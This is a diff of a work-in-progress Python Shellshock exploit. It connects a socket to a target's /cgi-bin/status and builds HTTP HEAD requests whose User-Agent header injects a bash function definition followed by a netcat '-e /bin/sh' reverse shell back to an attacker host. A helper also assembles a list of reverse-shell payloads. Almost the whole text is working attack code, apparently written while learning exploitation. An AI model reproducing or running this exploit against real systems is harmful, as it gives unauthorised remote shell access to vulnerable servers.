@@ -4,33 +4,36 @@ import urllib.request
 import socket
 # Consists of the HEAD request which is sent in addition to the custom headers
 def shellshock_http_req(lhost, lport, rhost, rport, target_url):
-   #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   # Connet a socket to the target running cgi-bin
-   #sock_connect = s.connect((rhost, rport))
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   # Connect a socket to the target running cgi-bin
+   sock_connect = s.connect((rhost, rport))
 
    ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
    # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string. Encoding the data helps with the data being sent as bytes
    rhost_encoded = rhost.encode() 
    lhost_encoded = lhost.encode()
-   rev_payload = shellshock_rev_payloads(lhost_encoded, lport)
+   # This contains a list of all the payloads which will be sent in a loop to segment all of the payloads
+   # No encoding should be made to the function call 
+   rev_payload = shellshock_rev_payloads(lhost, lport)
    #lport_encoded = lport.encode()
-   #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
-   #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
-   #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
    # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argument
+   #payload = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
+   payload = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
+   #s.sendall(payload)
+   print(payload)
    #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
    #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
    # Proof of concept payload in which reverse payloads are arbitrary and not declared statically in the socket
    #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
-   for payloads in rev_payload:
+   #for payloads in rev_payload:
        # List containing all of the payloads
-       #print(rev_payload)
-       #print(payloads)
-       payloads_encoded = payloads.encode()
-       #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads, rhost_encoded))
+        # All of the individual payloads. They're lacking the byte encoding of the host which is why a shell is not caught
+        #print(payloads)
+   #    payloads_encoded = payloads.encode()
+   #     payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads, rhost_encoded))
        #print(payloads)
        # Need to send these bytes in a socket, for testing purposes they're being printed to show what will be redirected to the socket later 
-       payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads_encoded, rhost_encoded))
+   #    payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads_encoded, rhost_encoded))
    #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
    # Payload needs to be added in accordance with the for loop of several payloads. A single variable of payload should be expected which should fulfil the conditions of all required parameters as part of the HEAD request and user agent modification   
 
@@ -46,8 +49,10 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
 
    #return payload
 ''' Paste in the URL from the shellshock_dect tool '''
+
+
+''' All local host entries need to be encoded using .encode() so that the payloads can execute properly in the request '''
 def shellshock_rev_payloads(lhost, lport):
-#def shellshock_rev_payloads(lhost, lport, target_url):
     ''' WE DON'T NEED TO CRAFT ANYMORE URLs!!! Because, we already have the one we're looking for; we just need to work with it '''
     ''' This is just a text value, no network ops happening '''
     reverse_payloads = []
